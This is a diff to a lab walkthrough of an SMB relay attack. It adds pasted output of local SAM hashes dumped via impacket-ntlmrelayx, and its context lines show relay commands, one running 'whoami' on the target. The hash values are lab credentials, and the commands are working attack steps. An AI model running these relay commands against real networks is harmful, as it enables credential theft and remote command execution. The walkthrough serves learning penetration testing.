@@ -72,9 +72,19 @@ SMB (Server Message Block) is a protocol used for file shares, printers, and oth
 
             impacket-ntlmrelax -tf targets.txt -smb2support
 
-![image](https://github.com/user-attachments/assets/ac597d69-e6d9-4da3-affa-ca352ce13850)
+![image](https://github.com/user-attachments/assets/ac597d69-e6d9-4da3-affa-ca352ce13850)  
 
-We have succesfully captured the NTLM hash from frankcastle with Responder and also relayed it back to the server using impacket-ntlmrelayx 
+            [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
+            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2709e4a8da75eb3a5c72700995058b08:::
+            peterparker:1001:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
+            [*] Done dumping SAM hashes for host: 192.168.64.140
+            [*] Stopping service RemoteRegistry
+            [*] Restoring the disabled state for service RemoteRegistry
+
+We have succesfully captured the NTLM hash from peterparker with Responder relaying the SAM authentication back to the server using impacket-ntlmrelayx. 
 
 6. Gaining interactive shell with impacket.
 
@@ -91,7 +101,7 @@ Once netcat has been binded to list all the available arguments that is availabl
 
             impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 
-![image](https://github.com/user-attachments/assets/0bda36ba-980a-444a-ad6d-de4fa828981a)
+![image](https://github.com/user-attachments/assets/0bda36ba-980a-444a-ad6d-de4fa828981a)  
 
 SMB relay attack with -c 'whoami' flag successful
 
